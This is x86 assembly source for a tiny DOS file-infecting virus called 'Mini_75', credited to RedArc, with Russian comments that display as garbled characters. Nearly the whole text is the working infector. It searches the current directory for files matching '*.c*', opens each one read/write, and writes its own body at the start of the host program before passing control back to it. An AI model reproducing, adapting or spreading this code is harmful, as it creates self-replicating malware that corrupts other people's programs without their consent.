; Mini_75 (c) by RedArc
;                             Thanx for FRiZER

;� ���� � ����஢���� COM-䠩��� � ⥪�饬 ��⠫���
;� ����஢���� � ��砫�
;� ��⠢��� �ணࠬ�� ࠡ��ᯮᮡ�묨
;� �� �஢���� �� ����୮� ��ࠦ����
;� �� ����� DTA (�᫨ � ��ࠬ��ࠬ �������� �� ��䮫�� cs:81h)
;� �� १������

Model Tiny
.code
org 100h
start:
       inc dh               ;� ����⢨⥫쭮, ��祬 �� � �p�� AX �����?
       mov es,dx            ;H� �� ��� ���p�...
       inc cx               ;����p� CX=100h - p����p PSP.
       mov si,bx            ;����塞 SI - �� ��砫� PSP
       scasw
       rep movsb            ;�����뢠�� ⥪�饥 PSP � ���p.
                            ;����p� SI=DI=100h, CX = 0

@CM0:
       push es              ;�� ��� ��p���� �p������� �p��p���� �p�� retf
       push di              ;�� ����, ��堥� � �⥪ ᥣ���� ���p� � ᬥ饭��

       mov si,virlength+100h ;H�砫� �p��p����, �� ���p�� �� ᥩ�� ᨤ��
       push cs              ;� �p��樯� ���� ⠪: mov cx,0ffffh-Virlength+100h
                            ;�� �� ��祬� � �� p���⠥�... :(
       pop cx               ;����⢥��� p����p ��p��뫠����� � ���p ����
       rep movsb            ;��p��뫠�� ��� �p��p����.
                            ;����p�, ES:0 - PSP ��襩 �����
                            ;ES:100h - "�뫥祭���" �p��p����

       mov dx,(virlength-6)+100h ;��p�� ��᪨ ��� ���᪠ 䠩��� �� 蠡����
       mov ah,4eh           ;�㭪�� ���᪠ 䠩��� �� 蠡���� ��� Int 21h
@0:
       int 21h              ;����⢥���, ���� 䠩��� �� 蠡����
       jnb @1               ;�᫨ 䠩� ������, �...
       retf                 ;� �⥪� ����� ��p�� ES:100h, ᬮ�p� @CM0

@1:
       mov ax,3d02h         ;�㭪�� ��p��� 䠩�� � p����� R/W ��� Int 21h
       mov dx,9eh           ;��p�� ����� ���������� 䠩�� � DTA
       int 21h              ;��p뢠�� 䠩�

       xchg bx,ax           ;�㥬 � BX ����p ��p�⮣� 䠩��

       mov ah,3fh           ;�㭪�� �⥭�� 䠩�� ��� Int 21h
       mov dx,virlength+100h ;����p� � DS:DX ���p ��� �⥭�� 䠩��
       push sp              ;�� �⮡� ����� ��� ����� ����� ���� �� 䠩��
       pop cx               ;����p� CX=0fffah
       int 21h              ;��⠥� �� ���������� 䠩��

       add ax,virlength     ;AX=FileLength, ������塞 p����p ��誨
       push ax              ;���p���� ��� ��᫥���饣� ���

       xor cx,cx            ;����塞 CX
       mul cx               ;����塞 AX � DX
       mov ah,42h           ;�㭪�� ᬥ饭�� ������p� ��� Int 21h
                            ;��� ��� AL=CX=DX=0, � ᬥ饭�� � ��砫� 䠩��
       int 21h              ;���頥� ������p

       pop cx               ;����p� CX=FileLength+VirLength
       mov ah,40h           ;�㭪�� ����� � 䠩� ��� Int 21h
       pop dx               ;����p� DX=100h, ᬮ�p� @CM0
       push dx              ;����p�頥� � �⥪ 100h
       int 21h              ;��襬 � 䠩� ��p�� + �p��p����

       mov ah,4fh           ;�㭪�� ���᪠ ᫥���饣� 䠩�� �� 蠡���� Int 21h
       jmp short @0         ;���� 䠩��

filename db '*.c*', 0h     ;��᪠ ��� ���᪠ 䠩�� �� 蠡����

virlength equ $-start       ;����� ��p�᭮�� ����

       ret                  ;������ ⥫� �p��p���� ��p��
end start
